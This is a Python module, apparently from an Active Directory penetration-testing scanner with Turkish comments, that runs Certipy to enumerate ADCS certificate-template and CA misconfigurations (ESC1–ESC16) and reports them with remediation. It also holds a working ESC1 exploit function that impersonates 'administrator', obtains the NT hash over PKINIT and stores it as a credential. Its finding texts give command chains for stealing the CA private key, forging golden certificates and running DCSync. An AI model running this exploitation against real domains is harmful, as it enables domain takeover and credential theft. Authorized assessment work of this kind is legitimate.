"""Certipy ile ADCS (Active Directory Certificate Services) zafiyet enumerasyonu.

ESC1–ESC8 gibi sertifika şablonu/CA yanlış yapılandırmaları, modern AD'de
Domain Admin'e giden en yaygın yoldur: düşük yetkili bir kullanıcı savunmasız
bir şablonla kendine DA kimliğiyle sertifika çıkarıp TGT/NT hash alabilir.

`certipy find -vulnerable` çıktısını okuyup bulunan ESC'leri raporlar. Kimlik
gerektirir (ADCS sorgusu auth ister); kimlik yoksa modül kendini atlar.
Kurulum:  pipx install certipy-ad   (ya da apt install certipy)
"""

from __future__ import annotations

import re

from ..findings import Finding, ScanReport, Severity
from ..runner import CommandResult, ToolStatus, resolve_tool, run, strip_dryrun

CERTIPY_CANDIDATES = ["certipy", "certipy-ad"]

# ESC'lerin kısa açıklamaları (raporu anlamlı kılmak için)
_ESC_DESC = {
    "1": "Şablon client-auth veriyor + enrollee subject belirleyebiliyor (DA taklidi)",
    "2": "Any Purpose / SubCA EKU ile her amaçlı sertifika",
    "3": "Enrollment Agent sertifikası -> başkası adına talep",
    "4": "Şablon ACL'i zayıf (yazılabilir) -> şablonu ESC1'e çevir",
    "6": "CA'da EDITF_ATTRIBUTESUBJECTALTNAME2 -> SAN ekleyerek DA",
    "7": "CA ACL'i zayıf (ManageCA/ManageCertificates)",
    "8": "HTTP web enrollment relay (NTLM relay -> sertifika)",
    "9": "No security extension (szOID) -> kimlik eşleme zayıf",
    "10": "Zayıf sertifika eşleme (StrongCertificateBindingEnforcement/UPN) -> kimlik taklidi",
    "11": "ICertPassage relay (ICPR)",
    "13": "Issuance policy -> yetkili gruba eşleme",
    "14": "Zayıf explicit sertifika eşleme (altSecurityIdentities) -> kimlik taklidi",
    "15": "Uygulama policy (schema v1 şablon) -> EKU enjeksiyonu / client-auth",
    "16": "Security extension CA'da devre dışı -> ESC9 benzeri kimlik eşleme baypası",
}


def tool() -> ToolStatus:
    return resolve_tool(CERTIPY_CANDIDATES)


def scan(
    target: str,
    *,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
    nthash: str | None = None,
    timeout: int = 300,
    dry_run: bool = False,
) -> list[CommandResult]:
    if username is None or not (password or nthash):
        return [CommandResult(
            tool="certipy:skip", argv=[], returncode=None, stdout="", stderr="",
            duration=0.0, error="certipy: kimlik gerekli (ADCS enum auth ister)")]

    bin_name = tool().name
    user = f"{username}@{domain}" if domain else username
    creds = ["-hashes", f":{nthash}"] if nthash else ["-p", password or ""]

    import tempfile
    jdir = tempfile.mkdtemp(prefix="adscan-certipy-")
    jprefix = f"{jdir}/cp"

    def argv(scheme: str | None) -> list[str]:
        # -json -output: stdout regex'ine EK olarak yapılandırılmış JSON üret
        # (ESC + CA ACL ayrıştırması biçim kaymasından etkilenmez).
        a = [bin_name, "find", "-u", user, "-dc-ip", target, "-vulnerable",
             "-stdout", "-json", "-output", jprefix]
        if scheme:
            a += ["-ldap-scheme", scheme]
        return a + creds

    # certipy v5 VARSAYILAN LDAPS'tir; bazı DC'lerde TLS reset olur
    # ("socket ssl wrapping error / Connection reset by peer"). Bu durumda düz
    # LDAP (389) ile otomatik tekrar denenir.
    res = run(argv(None), tool="certipy-find", timeout=timeout, dry_run=dry_run)
    if not dry_run and _ldaps_failed(res):
        res = run(argv("ldap"), tool="certipy-find", timeout=timeout, dry_run=dry_run)
    out = [res]
    if not dry_run:
        jres = _read_json_result(jprefix)
        if jres is not None:
            out.append(jres)
    return out


def _read_json_result(prefix: str) -> CommandResult | None:
    """certipy'nin yazdığı JSON çıktısını (varsa) bir CommandResult'a sarar."""
    import glob
    import os
    cands = glob.glob(prefix + "*.json") + glob.glob(prefix + "*_Certipy.json")
    for path in cands:
        try:
            with open(path, encoding="utf-8", errors="replace") as fh:
                data = fh.read()
            os.unlink(path)
            return CommandResult(tool="certipy:json", argv=[path], returncode=0,
                                 stdout=data, stderr="", duration=0.0)
        except OSError:
            continue
    return None


def _ldaps_failed(res: CommandResult) -> bool:
    """certipy LDAPS bağlantısı TLS/soket düzeyinde başarısız mı oldu?"""
    txt = res.combined or ""
    return bool(re.search(
        r"ssl wrapping|reset by peer|Errno 104|Errno 111|wrap_socket|"
        r"ssl.*error|handshake|EOF occurred|timed out", txt, re.IGNORECASE))


def parse(results: list[CommandResult], report: ScanReport) -> None:
    # JSON sonucunu ayır (raw_outputs/stdout ayrıştırmasını kirletmesin)
    json_res = next((r for r in results if r.tool == "certipy:json"), None)
    results = [r for r in results if r.tool != "certipy:json"]
    report.raw_outputs["certipy"] = "\n\n".join(r.combined for r in results)
    combined = strip_dryrun("\n\n".join(r.combined for r in results))
    target = report.target

    first = results[0] if results else None
    if first and first.tool == "certipy:skip":
        return  # kimlik yok — sessizce atla
    if first and not first.ok:
        report.add_error(f"certipy: {first.error or 'çalıştırılamadı'}")
        return

    # Yapılandırılmış JSON varsa önce ondan ESC + CA ACL çıkar (biçimden bağımsız,
    # daha güvenilir); report.add fingerprint ile stdout bulgularıyla çakışmaz.
    if json_res is not None:
        _parse_certipy_json(json_res.stdout, target, report)

    # Only explicit vulnerability entries belonging to a named object count.
    # A banner, help text or reference mentioning ESC1 is not a finding.
    obj = ""
    kind = ""
    vuln_indent = None
    version_match = re.search(r"Certipy\s+v?(\d+(?:\.\d+)*)", combined)
    for line in combined.splitlines():
        name = re.match(r"\s*(Template Name|CA Name)\s*:\s*(\S.*)", line)
        if name:
            kind, obj = name.group(1), name.group(2).strip()
            vuln_indent = None
            continue
        if line.strip() in {"Certificate Templates", "Certificate Authorities"} \
                or re.fullmatch(r"\s*\d+\s*", line):
            obj, vuln_indent = "", None
            continue
        if re.match(r"\s*\[[!*]\]\s*Vulnerabilities\s*$", line):
            vuln_indent = len(line) - len(line.lstrip())
            continue
        if vuln_indent is None or not line.strip():
            continue
        indent = len(line) - len(line.lstrip())
        if indent <= vuln_indent:
            vuln_indent = None
            continue
        match = re.match(r"\s*ESC(\d{1,2})\s*:\s*(\S.*)", line)
        if not match or not obj:
            continue
        esc, detail = match.groups()
        if re.search(r"\bnot vulnerable\b|\bnot affected\b|\bdisabled\b|^none$|^false$",
                     detail, re.IGNORECASE):
            continue
        report.add(Finding(
            title=f"ADCS savunmasız: ESC{esc} — {obj} — certipy",
            severity=Severity.HIGH, target=target, source="certipy",
            control_id=f"adcs.esc{esc}", object_id=f"{kind}:{obj}",
            verification="tool_reported",
            tool_version=version_match.group(1) if version_match else "unknown",
            description="Certipy yapılandırma riski bildirdi; mevcut kimlikle "
                        "istismar edilebilirlik ve Domain Admin erişimi doğrulanmadı.",
            evidence=f"{kind}: {obj}\nESC{esc}: {detail}",
            remediation="İlgili CA/şablonun enrollment izinlerini, ACL, EKU ve "
                        "sertifika eşleme politikasını inceleyip gereksiz hakları kaldırın.",
            reference=f"ADCS ESC{esc}",
            poc="Aynı nesnede yapılandırma ve etkin erişim izinlerini yeniden kontrol edin.",
            escalation="Önkoşullar doğrulanmadı; olası etki bağımsız inceleme gerektirir."))
    if re.search(r"\bESC\d+\b", combined) and not any(
            f.source == "certipy" for f in report.findings):
        report.add_error("certipy: ESC metni var ancak nesneye bağlı olumlu bulgu ayrıştırılamadı")

    _check_esc7_ca_rights(combined, target, report)


def _find_vuln_dict(obj: dict) -> dict:
    """certipy JSON nesnesindeki 'Vulnerabilities' alt sözlüğünü bulur (prefix değişebilir)."""
    for k, v in obj.items():
        if isinstance(v, dict) and "vulnerabilit" in k.lower():
            return v
    return {}


def _parse_certipy_json(text: str, target: str, report: ScanReport) -> None:
    """certipy -json çıktısından ESC bulgularını çıkarır (stdout'a ek, sağlam)."""
    import json as _json
    try:
        data = _json.loads(text)
    except (ValueError, TypeError):
        return
    if not isinstance(data, dict):
        return
    version = "unknown"
    sections = {
        "Certificate Templates": "Template Name",
        "Certificate Authorities": "CA Name",
    }
    for section, namekey in sections.items():
        block = data.get(section)
        if not isinstance(block, dict):
            continue
        for _idx, obj in block.items():
            if not isinstance(obj, dict):
                continue
            name = str(obj.get(namekey, "?")).strip()
            vulns = _find_vuln_dict(obj)
            for esc_key, detail in vulns.items():
                m = re.search(r"ESC(\d{1,2})", str(esc_key) + " " + str(detail))
                if not m:
                    continue
                esc = m.group(1)
                report.add(Finding(
                    title=f"ADCS savunmasız: ESC{esc} — {name} — certipy(json)",
                    severity=Severity.HIGH, target=target, source="certipy",
                    control_id=f"adcs.esc{esc}", object_id=f"{namekey}:{name}",
                    verification="tool_reported", tool_version=version,
                    description="Certipy (JSON) yapılandırma riski bildirdi; mevcut kimlikle "
                                "istismar edilebilirlik bağımsız doğrulanmalı.",
                    evidence=f"{namekey}: {name}\nESC{esc}: {detail}",
                    remediation="İlgili CA/şablonun enrollment izinlerini, ACL, EKU ve "
                                "sertifika eşleme politikasını inceleyip gereksiz hakları kaldırın.",
                    reference=f"ADCS ESC{esc}", mitre="T1649",
                    poc=f"certipy find -u <user>@<dom> -p <pass> -dc-ip {target} -vulnerable -stdout",
                    escalation="ESC1/3/9/10: certipy req + auth -> PKINIT -> NT hash/TGT. "
                               "ESC4: şablonu ESC1'e çevir. ESC6/7: SAN/officer -> DA sertifikası."))


# Varsayılan/beklenen yüksek-yetki principal'ları (bunlara ManageCA olması normal).
_DEFAULT_CA_PRINCIPALS = re.compile(
    r"Administrators|Enterprise Admins|Domain Admins|Enterprise Key Admins|"
    r"\bSYSTEM\b|BUILTIN|-512\b|-519\b|-500\b|S-1-5-18|S-1-5-32-544", re.IGNORECASE)


def _check_esc7_ca_rights(combined: str, target: str, report: ScanReport) -> None:
    """CA ACL'inde ManageCA/ManageCertificates varsayılan OLMAYAN bir principal'a
    verilmişse ESC7 adayı olarak raporlar.

    certipy `-vulnerable` bunu tek başına "vulnerable" saymaz; ama özel bir grup
    (ör. Helpdesk_Cert_Support) CA officer/manager ise ESC7'ye (talep onaylama /
    SAN etkinleştirme / kendine hak verme) giden gerçek bir yoldur.
    """
    ca_name = ""
    right = ""  # "ManageCa" | "ManageCertificates"
    base_indent = None
    hits: dict[str, set[str]] = {}  # right -> {principals}
    for line in combined.splitlines():
        m = re.match(r"\s*CA Name\s*:\s*(\S.*)", line)
        if m:
            ca_name = m.group(1).strip()
            right = ""
            continue
        m = re.match(r"(\s*)(ManageCa|ManageCertificates)\s*:\s*(\S.*)?", line)
        if m:
            base_indent = len(m.group(1))
            right = m.group(2)
            val = (m.group(3) or "").strip()
            if val and not _DEFAULT_CA_PRINCIPALS.search(val):
                hits.setdefault(right, set()).add(val)
            continue
        # ManageCa/Certificates değeri birden çok satıra yayılabilir (girintili)
        if right and line.strip():
            indent = len(line) - len(line.lstrip())
            if base_indent is not None and indent > base_indent:
                val = line.strip()
                if not _DEFAULT_CA_PRINCIPALS.search(val):
                    hits.setdefault(right, set()).add(val)
                continue
            right = ""  # girinti bitti; değer bloğu kapandı
    if not hits:
        return
    manage_ca = sorted(hits.get("ManageCa", set()))
    manage_cert = sorted(hits.get("ManageCertificates", set()))
    sev = Severity.HIGH if manage_ca else Severity.MEDIUM
    ev_lines = []
    if manage_ca:
        ev_lines.append("ManageCA  -> " + ", ".join(manage_ca))
    if manage_cert:
        ev_lines.append("ManageCertificates -> " + ", ".join(manage_cert))
    report.add(Finding(
        title=f"ADCS ESC7 adayı: CA '{ca_name or '?'}' üzerinde zayıf yönetim hakları — certipy",
        severity=sev, target=target, source="certipy",
        control_id="adcs.esc7.candidate", object_id=f"CA Name:{ca_name}",
        verification="tool_reported",
        reference="ADCS ESC7 (Vulnerable CA Access Control)",
        mitre="T1649",
        description="CA'nın ManageCA/ManageCertificates hakları varsayılan olmayan bir "
                    "principal'a verilmiş. ManageCA = SAN etkinleştirme (ESC6) / kendine "
                    "ManageCertificates verme; ManageCertificates = reddedilmiş talebi "
                    "onaylama (ör. SubCA şablonu) — ESC7 zinciri.",
        evidence="\n".join(ev_lines),
        remediation="CA Security üzerindeki ManageCA/ManageCertificates haklarını yalnızca "
                    "PKI yöneticileriyle sınırla; özel grup üyeliklerini denetle.",
        poc=f"certipy find -u <user>@<dom> -p <pass> -dc-ip {target} -stdout | "
            "grep -iA3 'ManageCa\\|ManageCertificates'",
        escalation="ManageCA: certipy ca -ca <CA> -enable-template SubCA; kendine officer "
                   "hakkı ver; SubCA talebini onayla -> DA sertifikası. ManageCertificates: "
                   "reddedilmiş SubCA talebini 'certipy ca -issue-request <id>' ile onayla."))
    if manage_ca:
        # ManageCA = CA özel anahtarını yedekleyip (çalıp) GOLDEN CERTIFICATE ile
        # herhangi bir kullanıcı adına sertifika üretme = kalıcı domain ele geçirme.
        report.add(Finding(
            title=f"Golden Certificate riski: CA '{ca_name or '?'}' özel anahtarı çalınabilir "
                  "(ManageCA)",
            severity=Severity.HIGH, target=target, source="certipy",
            control_id="adcs.golden-cert", object_id=f"CA Name:{ca_name}",
            verification="tool_reported", mitre="T1649",
            reference="Golden Certificate (CA private key theft)",
            description="ManageCA hakkıyla CA sertifikası + özel anahtarı yedeklenip (certipy "
                        "ca -backup) çevrimdışı ALINABİLİR. Çalınan CA anahtarıyla herhangi "
                        "bir kullanıcı (DA) adına geçerli sertifika SAHTE olarak üretilir — "
                        "krbtgt sıfırlamasından bile etkilenmeyen kalıcı domain erişimi.",
            evidence="ManageCA -> " + ", ".join(manage_ca),
            remediation="ManageCA haklarını kısıtla; CA anahtarını HSM'de tut; CA yedek/erişim "
                        "olaylarını izle; ihlal halinde CA'yı yeniden anahtarla.",
            poc=f"certipy ca -backup -ca '{ca_name or '<CA>'}' -u <user>@<dom> -p <pass> "
                f"-dc-ip {target}",
            escalation="CA .pfx -> golden cert: certipy forge -ca-pfx <CA>.pfx "
                       "-upn administrator@<dom> -subject 'CN=Administrator' -> certipy auth "
                       "-pfx administrator.pfx -> NT hash/TGT (kalıcı DA)."))


def _esc1_target(report) -> tuple[str, str] | None:
    """Raporda ESC1 bulgusu varsa (şablon, CA) adını çıkarır."""
    ca = ""
    for f in report.findings:
        if f.source == "certipy" and f.control_id == "adcs.esc7.candidate":
            m = re.search(r"CA '([^']+)'", f.title)
            if m:
                ca = m.group(1)
    for f in report.findings:
        if f.source == "certipy" and f.control_id == "adcs.esc1":
            # object_id = "Template Name:<ad>"
            tmpl = f.object_id.split(":", 1)[1] if ":" in f.object_id else ""
            if tmpl:
                return tmpl, ca
    return None


def exploit_esc1(ctx: ScanContext, report, *, impersonate: str = "administrator",
                 force: bool = False) -> None:
    """ESC1: savunmasız şablonla DA kimliğiyle sertifika iste -> PKINIT -> NT hash.

    AKTİF. `--adcs-exploit` + `--active-attacks` onayıyla veya force=True (autopilot
    zinciri, onay zaten alınmış) ve raporda ESC1 bulgusu varsa çalışır.
    """
    if (not ctx.adcs_exploit and not force) or ctx.dry_run:
        return
    if ctx.username is None or not (ctx.password or ctx.nthash):
        return
    hit = _esc1_target(report)
    if not hit:
        return
    tmpl, ca = hit
    bin_name = tool().name
    user = f"{ctx.username}@{ctx.domain}" if ctx.domain else ctx.username
    creds = ["-hashes", f":{ctx.nthash}"] if ctx.nthash else ["-p", ctx.password or ""]
    upn = f"{impersonate}@{ctx.domain}" if ctx.domain else impersonate
    req = [bin_name, "req", "-u", user, "-dc-ip", ctx.target, "-template", tmpl,
           "-upn", upn] + (["-ca", ca] if ca else []) + creds
    r1 = run(req, tool="certipy-req", timeout=ctx.timeout)
    out1 = strip_dryrun(r1.combined)
    pfx = re.search(r"Saved certificate and private key to '([^']+\.pfx)'", out1)
    if not pfx:
        report.add_error(f"adcs-exploit: ESC1 sertifika isteği başarısız ({tmpl})")
        return
    auth = [bin_name, "auth", "-pfx", pfx.group(1), "-dc-ip", ctx.target]
    r2 = run(auth, tool="certipy-auth", timeout=ctx.timeout)
    out2 = strip_dryrun(r2.combined)
    nt = re.search(r"[0-9a-f]{32}:([0-9a-f]{32})", out2)
    report.raw_outputs["certipy-exploit"] = out1 + "\n\n" + out2
    if nt:
        from ..findings import Credential
        report.add_credential(Credential(username=impersonate, secret=nt.group(1),
                                          kind="nthash", domain=report.domain or "",
                                          source="adcs-esc1", host=ctx.target, admin=True))
        report.add(Finding(
            title=f"ADCS ESC1 İSTİSMAR EDİLDI — '{impersonate}' NT hash'i alındı — certipy",
            severity=Severity.CRITICAL, target=ctx.target, source="certipy",
            control_id="adcs.esc1.exploited", verification="exploited", mitre="T1649",
            reference=f"ADCS ESC1 ({tmpl})",
            description=f"Savunmasız '{tmpl}' şablonuyla '{impersonate}' adına sertifika "
                        "alınıp PKINIT ile NT hash elde edildi.",
            evidence=f"Şablon: {tmpl}  CA: {ca or '?'}  -> {impersonate} NT hash",
            remediation="Şablonda enrollee-supplies-subject + client-auth kombinasyonunu "
                        "kaldır; enrollment izinlerini kısıtla; manager approval iste.",
            poc=f"certipy req -u {user} -template {tmpl} -upn {upn} -ca {ca or '<CA>'} -dc-ip {ctx.target}",
            escalation=f"secretsdump.py -hashes :{nt.group(1)} {report.domain or '<dom>'}/"
                       f"{impersonate}@{ctx.target} -just-dc   # DCSync -> krbtgt (DA)"))
    else:
        report.add_error(f"adcs-exploit: PKINIT auth NT hash vermedi ({tmpl})")


# ---------------------------------------------------------------------------
# Registry adaptörü + kaydı
# ---------------------------------------------------------------------------

from ..registry import ScanContext, ScanModule  # noqa: E402


def _run(ctx: ScanContext) -> list[CommandResult]:
    return scan(ctx.target, domain=ctx.domain, username=ctx.username,
                password=ctx.password, nthash=ctx.nthash,
                timeout=ctx.timeout, dry_run=ctx.dry_run)


MODULE = ScanModule(
    name="certipy",
    label="certipy ADCS ESC zafiyet taraması (opt-in, kimlik gerektirir)",
    run=_run,
    parse=parse,
    requires_creds=True,
    optin=True,
)
